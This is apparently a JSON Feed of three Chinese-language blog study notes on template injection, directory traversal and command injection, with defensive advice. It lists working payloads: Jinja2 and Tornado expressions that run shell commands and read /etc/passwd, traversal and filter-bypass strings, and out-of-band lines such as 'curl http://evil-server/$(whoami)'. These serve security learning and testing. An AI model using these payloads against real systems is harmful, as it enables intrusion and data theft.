{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"绕过\" tag",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "title": "模板注入",
            "date_published": "2022-11-27T01:51:54.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p>\n<h1 id=\"测试方法\"><a class=\"anchor\" href=\"#测试方法\">#</a> 测试方法</h1>\n<ul>\n<li>确定使用的引擎</li>\n<li>查看引擎相关的文档，确定其安全机制以及自带的函数和变量</li>\n<li>需找攻击面，尝试攻击</li>\n</ul>\n<h1 id=\"测试用例\"><a class=\"anchor\" href=\"#测试用例\">#</a> 测试用例</h1>\n<ul>\n<li>\n<p>简单的数学表达式， <code>&#123;&#123; 7+7 &#125;&#125; =&gt; 14</code></p>\n</li>\n<li>\n<p>字符串表达式  <code>&#123;&#123; \"ajin\" &#125;&#125; =&gt; ajin</code></p>\n</li>\n<li>\n<p>Ruby</p>\n<ul>\n<li><code>&lt;%= 7 * 7 %&gt;</code></li>\n<li><code>&lt;%= File.open('/etc/passwd').read %&gt;</code></li>\n</ul>\n</li>\n<li>\n<p>Java</p>\n<ul>\n<li><code>$&#123;7*7&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Twig</p>\n<ul>\n<li><code>&#123;&#123;7*7&#125;&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Smarty</p>\n<ul>\n<li><code>&#123;php&#125;echo `id`;&#123;/php&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>AngularJS</p>\n<ul>\n<li><code>$eval('1+1')</code></li>\n</ul>\n</li>\n<li>\n<p>Tornado</p>\n<ul>\n<li>引用模块  <code>&#123;% import module %&#125;</code></li>\n<li>=&gt;  <code>&#123;% import os %&#125;&#123;&#123; os.popen(\"whoami\").read() &#125;&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Flask/Jinja2</p>\n<ul>\n<li><code>&#123;&#123; config &#125;&#125;</code></li>\n<li><code>&#123;&#123; config.items() &#125;&#125;</code></li>\n<li><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></li>\n<li><code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()&#125;&#125;</code></li>\n<li><code>&#123;&#123; url_for.__globals__['__builtins__'].__import__('os').system('ls') &#125;&#125;</code></li>\n<li><code>&#123;&#123; request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() &#125;&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Django</p>\n<ul>\n<li><code>&#123;&#123; request &#125;&#125;</code></li>\n<li><code>&#123;% debug %&#125;</code></li>\n<li><code>&#123;% load module %&#125;</code></li>\n<li><code>&#123;% include \"x.html\" %&#125;</code></li>\n<li><code>&#123;% extends \"x.html\" %&#125;</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"目标\"><a class=\"anchor\" href=\"#目标\">#</a> 目标</h1>\n<ul>\n<li>创建对象</li>\n<li>文件读写</li>\n<li>远程文件包含</li>\n<li>信息泄漏</li>\n<li>提权</li>\n</ul>\n<h1 id=\"相关属性\"><a class=\"anchor\" href=\"#相关属性\">#</a> 相关属性</h1>\n<h2 id=\"__class__\"><a class=\"anchor\" href=\"#__class__\">#</a>  <code>__class__</code></h2>\n<p>python 中的新式类（即显示继承 object 对象的类）都有一个属性  <code>__class__</code>  用于获取当前实例对应的类，例如  <code>&quot;&quot;.__class__</code>  就可以获取到字符串实例对应的类</p>\n<h2 id=\"__mro__\"><a class=\"anchor\" href=\"#__mro__\">#</a>  <code>__mro__</code></h2>\n<p>python 中类对象的  <code>__mro__</code>  属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中元素的顺序是 MRO（Method Resolution Order） 寻找的顺序。</p>\n<h2 id=\"__globals__\"><a class=\"anchor\" href=\"#__globals__\">#</a>  <code>__globals__</code></h2>\n<p>保存了函数所有的所有全局变量，在利用中，可以使用  <code>__init__</code>  获取对象的函数，并通过  <code>__globals__</code>  获取  <code>file</code>   <code>os</code>  等模块以进行下一步的利用</p>\n<h2 id=\"__subclasses__\"><a class=\"anchor\" href=\"#__subclasses__\">#</a>  <code>__subclasses__()</code></h2>\n<p>python 的新式类都保留了它所有的子类的引用， <code>__subclasses__()</code>  这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。</p>\n<p>因为 python 中的类都是继承 object 的，所以只要调用 object 类对象的  <code>__subclasses__()</code>  方法就可以获取想要的类的对象。</p>\n<h1 id=\"常见payload\"><a class=\"anchor\" href=\"#常见payload\">#</a> 常见 Payload</h1>\n<ul>\n<li><code>().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()</code></li>\n<li><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()' )</code></li>\n</ul>\n<h1 id=\"绕过技巧\"><a class=\"anchor\" href=\"#绕过技巧\">#</a> 绕过技巧</h1>\n<h2 id=\"字符串拼接\"><a class=\"anchor\" href=\"#字符串拼接\">#</a> 字符串拼接</h2>\n<pre><code>request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]\n</code></pre>\n<h2 id=\"使用参数绕过\"><a class=\"anchor\" href=\"#使用参数绕过\">#</a> 使用参数绕过</h2>\n<pre><code>params = &#123;\n    'clas': '__class__',\n    'mr': '__mro__',\n    'subc': '__subclasses__'\n&#125;\ndata = &#123;\n    &quot;data&quot;: &quot;&#123;&#123;''[request.args.clas][request.args.mr][1][request.args.subc]()&#125;&#125;&quot;\n&#125;\nr = requests.post(url, params=params, data=data)\nprint(r.text)\n</code></pre>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==\">服务端模版注入</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cua25vd25zZWMuY29tLzIwMTYvMDIvdXNlLXB5dGhvbi1mZWF0dXJlcy10by1leGVjdXRlLWFyYml0cmFyeS1jb2Rlcy1pbi1qaW5qYTItdGVtcGxhdGVzLw==\">用 Python 特性任意代码执行</span></li>\n</ul>\n",
            "tags": [
                "注入",
                "绕过"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/",
            "title": "目录穿越",
            "date_published": "2022-11-26T12:44:44.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>目录穿越（也被称为目录遍历 /directory traversal/path traversal）是通过使用  <code>../</code>  等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。</p>\n<h1 id=\"攻击载荷\"><a class=\"anchor\" href=\"#攻击载荷\">#</a> 攻击载荷</h1>\n<h2 id=\"url参数\"><a class=\"anchor\" href=\"#url参数\">#</a> URL 参数</h2>\n<ul>\n<li><code>../</code></li>\n<li><code>..\\</code></li>\n<li><code>..;/</code></li>\n</ul>\n<h2 id=\"nginx-off-by-slash\"><a class=\"anchor\" href=\"#nginx-off-by-slash\">#</a> Nginx Off by Slash</h2>\n<ul>\n<li><code>https://vuln.site.com/files../</code></li>\n</ul>\n<h2 id=\"unc-bypass\"><a class=\"anchor\" href=\"#unc-bypass\">#</a> UNC Bypass</h2>\n<ul>\n<li><code>\\\\localhost\\c$\\windows\\win.ini</code></li>\n</ul>\n<h1 id=\"过滤绕过\"><a class=\"anchor\" href=\"#过滤绕过\">#</a> 过滤绕过</h1>\n<ul>\n<li>\n<p>单次替换</p>\n<ul>\n<li><code>...//</code></li>\n</ul>\n</li>\n<li>\n<p>URL 编码</p>\n</li>\n<li>\n<p>16 位 Unicode 编码</p>\n<ul>\n<li><code>\\u002e</code></li>\n</ul>\n</li>\n<li>\n<p>超长 UTF-8 编码</p>\n<ul>\n<li><code>\\%e0%40%ae</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<p>在进行文件操作相关的 API 前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。</p>\n<p>若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2ZpbGUtcGF0aC10cmF2ZXJzYWw=\">Directory traversal by portswigger</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QYXRoX1RyYXZlcnNhbA==\">Path Traversal by OWASP</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy5tc2RuLm1pY3Jvc29mdC5jb20vamVyZW15a3VobmUvMjAxNi8wNC8yMS9wYXRoLW5vcm1hbGl6YXRpb24v\">path normalization</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmJsYWNraGF0LmNvbS91cy0xOC9XZWQtQXVndXN0LTgvdXMtMTgtT3JhbmdlLVRzYWktQnJlYWtpbmctUGFyc2VyLUxvZ2ljLVRha2UtWW91ci1QYXRoLU5vcm1hbGl6YXRpb24tT2ZmLUFuZC1Qb3AtMGRheXMtT3V0LTIucGRm\">Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon</span></li>\n</ul>\n",
            "tags": [
                "绕过",
                "遍历"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/",
            "title": "命令注入",
            "date_published": "2022-11-26T09:30:44.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>命令注入通常因为指 Web 应用在服务器上拼接系统命令而造成的漏洞。</p>\n<p>该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些 Web 管理界面的配置主机名 / IP / 掩码 / 网关、查看系统信息以及关闭重启等功能，或者一些站点提供如 ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。</p>\n<h1 id=\"常见危险函数\"><a class=\"anchor\" href=\"#常见危险函数\">#</a> 常见危险函数</h1>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h2>\n<ul>\n<li>system</li>\n<li>exec</li>\n<li>passthru</li>\n<li>shell_exec</li>\n<li>popen</li>\n<li>proc_open</li>\n</ul>\n<h2 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h2>\n<ul>\n<li>system</li>\n<li>popen</li>\n<li>subprocess.call</li>\n<li>spawn</li>\n</ul>\n<h2 id=\"java\"><a class=\"anchor\" href=\"#java\">#</a> Java</h2>\n<ul>\n<li>java.lang.Runtime.getRuntime().exec(command)</li>\n</ul>\n<h1 id=\"常见注入方式\"><a class=\"anchor\" href=\"#常见注入方式\">#</a> 常见注入方式</h1>\n<ul>\n<li>分号分割</li>\n<li><code>||</code>   <code>&amp;&amp;</code>   <code>&amp;</code>  分割</li>\n<li><code>|</code>  管道符</li>\n<li><code>\\r\\n</code>   <code>%d0%a0</code>  换行</li>\n<li>反引号解析</li>\n<li><code>$()</code>  替换</li>\n</ul>\n<h1 id=\"无回显技巧\"><a class=\"anchor\" href=\"#无回显技巧\">#</a> 无回显技巧</h1>\n<ul>\n<li>\n<p>bash 反弹 shell</p>\n</li>\n<li>\n<p>DNS 带外数据</p>\n</li>\n<li>\n<p>http 带外</p>\n<ul>\n<li><code>curl http://evil-server/$(whoami)</code></li>\n<li><code>wget http://evil-server/$(whoami)</code></li>\n</ul>\n</li>\n<li>\n<p>无带外时利用  <code>sleep</code>  或其他逻辑构造布尔条件</p>\n</li>\n</ul>\n<h1 id=\"常见绕过方式\"><a class=\"anchor\" href=\"#常见绕过方式\">#</a> 常见绕过方式</h1>\n<h2 id=\"空格绕过\"><a class=\"anchor\" href=\"#空格绕过\">#</a> 空格绕过</h2>\n<ul>\n<li><code>&lt;</code>  符号  <code>cat&lt;123</code></li>\n<li><code>\\t</code>  /  <code>%09</code></li>\n<li><code>$&#123;IFS&#125;</code>   其中 {} 用来截断，比如 <code>cat$IFS2</code>  会被认为 IFS2 是变量名。另外，在后面加个 $ 可以起到截断的作用，一般用 $9，因为 $9 是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串</li>\n</ul>\n<h2 id=\"黑名单绕过\"><a class=\"anchor\" href=\"#黑名单绕过\">#</a> 黑名单绕过</h2>\n<ul>\n<li><code>a=l;b=s;$a$b</code></li>\n<li>base64  <code>echo &quot;bHM=&quot; | base64 -d</code></li>\n<li><code>/?in/?s</code>  =&gt;  <code>/bin/ls</code></li>\n<li>连接符  <code>cat /etc/pass'w'd</code></li>\n<li>未定义的初始化变量  <code>cat$x /etc/passwd</code></li>\n</ul>\n<h2 id=\"长度限制绕过\"><a class=\"anchor\" href=\"#长度限制绕过\">#</a> 长度限制绕过</h2>\n<pre><code>&gt;wget\\\n&gt;foo.\\\n&gt;com\nls -t&gt;a\nsh a\n</code></pre>\n<p>上面的方法为通过命令行重定向写入命令，接着通过 ls 按时间排序把命令写入文件，最后执行 直接在 Linux 终端下执行的话，创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如 w,[之类的短命令，(使用 ls /usr/bin/? 查看) 如果不添加命令，需要 Ctrl+D 才能结束，这样就等于标准输入流的重定向 而在 php 中，使用 shell_exec 等执行系统命令的函数的时候，是不存在标准输入流的，所以可以直接创建文件</p>\n<h1 id=\"常用符号\"><a class=\"anchor\" href=\"#常用符号\">#</a> 常用符号</h1>\n<h2 id=\"命令分隔符\"><a class=\"anchor\" href=\"#命令分隔符\">#</a> 命令分隔符</h2>\n<ul>\n<li><code>%0a</code>  /  <code>%0d</code>  /  <code>\\n</code>  /  <code>\\r</code></li>\n<li><code>;</code></li>\n<li><code>&amp;</code>  /  <code>&amp;&amp;</code></li>\n</ul>\n<h2 id=\"通配符\"><a class=\"anchor\" href=\"#通配符\">#</a> 通配符</h2>\n<ul>\n<li><code>*</code>  0 到无穷个任意字符</li>\n<li><code>?</code>  一个任意字符</li>\n<li><code>[ ]</code>  一个在括号内的字符，e.g.  <code>[abcd]</code></li>\n<li><code>[ - ]</code>  在编码顺序内的所有字符</li>\n<li><code>[^ ]</code>  一个不在括号内的字符</li>\n</ul>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<ul>\n<li>\n<p>不使用时禁用相应函数</p>\n</li>\n<li>\n<p>尽量不要执行外部的应用程序或命令</p>\n</li>\n<li>\n<p>做输入的格式检查</p>\n</li>\n<li>\n<p>转义命令中的所有 shell 元字符</p>\n<ul>\n<li>shell 元字符包括  <code>#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\\</code></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "注入",
                "函数",
                "绕过"
            ]
        }
    ]
}